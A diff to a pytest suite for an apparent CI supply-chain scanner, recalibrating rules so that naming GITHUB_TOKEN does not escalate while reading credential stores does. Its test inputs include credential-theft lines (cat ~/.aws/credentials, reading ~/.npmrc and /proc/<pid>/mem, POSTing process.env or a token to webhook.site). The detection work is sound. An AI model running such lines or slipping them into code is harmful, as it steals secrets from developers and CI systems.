@@ -795,9 +795,9 @@ def test_the_historical_example_is_kept_on_precedent_instead():
 
 
 def test_precedent_is_empty_where_there_is_no_named_example():
-    findings = rules.scan(_change([_file("a.js", _added("process.env)"))]))
-    secret = next(f for f in findings if f.rule_id == "content.secret_access")
-    assert secret.precedent == ""
+    findings = rules.scan(_change([_file("a.js", _added("const t = process.env.GITHUB_TOKEN;"))]))
+    ref = next(f for f in findings if f.rule_id == "content.token_reference")
+    assert ref.precedent == ""
 
 
 # ============================================================== held-out corpus regressions
@@ -950,3 +950,70 @@ def test_tag_rationales_do_not_name_incidents():
     for finding in (f for fs in found.values() for f in fs):
         assert not re.search(r"tj-actions|reviewdog", finding.rationale, re.IGNORECASE)
         assert finding.precedent
+
+
+# ============================================================== credential stores vs token names
+
+# Calibrated on the first Actions hunt: as `secret_access`, naming GITHUB_TOKEN was the sole
+# evidence for 14 of 40 alerts. In an Action it is the credential the action is supposed
+# to use. Reading a credential store or process memory is still theft-shaped everywhere.
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "* @param     token    the repo PAT or GITHUB_TOKEN",   # doc comment, 12x in the hunt
+        "github_token: ${{ secrets.GITHUB_TOKEN }}",             # ordinary action usage
+        "process.env.GITHUB_TOKEN = 'tok0';",                     # a test fixture
+        "//registry.npmjs.org/:_authToken=${NPM_TOKEN}",         # how npm publishing works
+    ],
+)
+def test_naming_a_token_does_not_escalate(line):
+    findings = rules.scan(_change([_file("src/index.js", _added(line))]))
+    assert "content.secret_access" not in _ids(findings)
+    assert "content.token_reference" in _ids(findings)
+    assert not rules.should_escalate(findings)
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "fs.readFileSync(os.homedir() + '/.npmrc')",
+        "open('/proc/' + pid + '/mem', 'rb')",
+        "cat ~/.aws/credentials",
+        "fetch(url, {body: JSON.stringify(process.env)})",
+    ],
+)
+def test_reading_a_credential_store_still_escalates(line):
+    findings = rules.scan(_change([_file("src/index.js", _added(line))]))
+    assert _sev(findings, "content.secret_access") == "high"
+    assert rules.should_escalate(findings)
+
+
+def test_a_token_sent_to_a_paste_site_is_still_exfiltration():
+    findings = rules.scan(_change([_file("src/index.js", _added(
+        "const t = process.env.GITHUB_TOKEN;",
+        "fetch('https://webhook.site/abc', {method: 'POST', body: t});",
+    ))]))
+    assert "combo.credential_exfiltration" in _ids(findings)
+    assert rules.should_escalate(findings)
+
+
+def test_a_token_reference_cannot_feed_the_capability_bonus():
+    # Like asset_added: naming GITHUB_TOKEN beside a subprocess call and a curl to the
+    # GitHub API is an ordinary action, and must not accumulate its way to escalation.
+    assert "content.token_reference" not in rules.RULE_CATEGORY
+
+
+@pytest.mark.parametrize(
+    "line,expected",
+    [
+        ("open('/proc/' + pid + '/mem', 'rb')", True),      # concatenation evasion
+        ("os.path.join('/proc', pid, 'mem')", True),        # path-join evasion
+        ('mem_path = f"/proc/{pid}/mem"', True),            # the real reviewdog payload's form
+        ("cat /proc/meminfo", False),                       # ordinary diagnostics
+        ("read /proc/cpuinfo for memory stats", False),
+    ],
+)
+def test_process_memory_access_survives_path_assembly(line, expected):
+    assert bool(rules.SECRET_ACCESS.search(line)) is expected
